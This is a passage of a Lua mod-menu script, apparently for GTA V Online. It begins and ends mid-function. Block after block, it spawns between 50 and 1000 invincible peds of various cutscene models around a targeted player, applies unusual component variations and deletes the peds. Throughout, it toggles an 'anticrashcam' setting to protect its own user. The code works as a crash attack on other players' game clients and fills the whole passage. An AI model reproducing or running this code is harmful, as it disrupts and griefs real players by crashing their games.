                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds1[i])
                            util.yield(5)
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("A_C_Rabbit_02")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds2 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, true)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds2[i])
                            util.yield(5)
                        end
                        util.yield(5)
                        local pedhash = util.joaat("cs_taocheng")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds3 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, true)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                            util.yield()
                        end
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds3[i])
                            util.yield(5)
                        end
                        util.yield(5)
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("cs_solomon")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds4 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds4[i])
                            util.yield(5)
                        end
                        util.yield(5)
                        local pedhash = util.joaat("cs_stevehains")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds5 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, true)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds5[i])
                            util.yield(5)
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("cs_taostranslator")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds6 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds6[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_debra")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds7 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds7[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_devin")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds8 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds8[i])
                            util.yield(5)
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("cs_guadalope")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds9 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        local pedhash = util.joaat("cs_gurk")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds10 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds10[i])
                            util.yield(5)
                        end
                        
                        local pedhash = util.joaat("cs_jimmydisanto")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds11 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds11[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_josh")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds12 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds12[i])
                            util.yield(5)
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("cs_lamardavis")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds13 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, true)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds13[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_lestercres")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds14 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, true)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds14[i])
                            util.yield(5)
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("cs_lestercrest_3")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds15 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds15[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_martinmadrazo")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds16 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
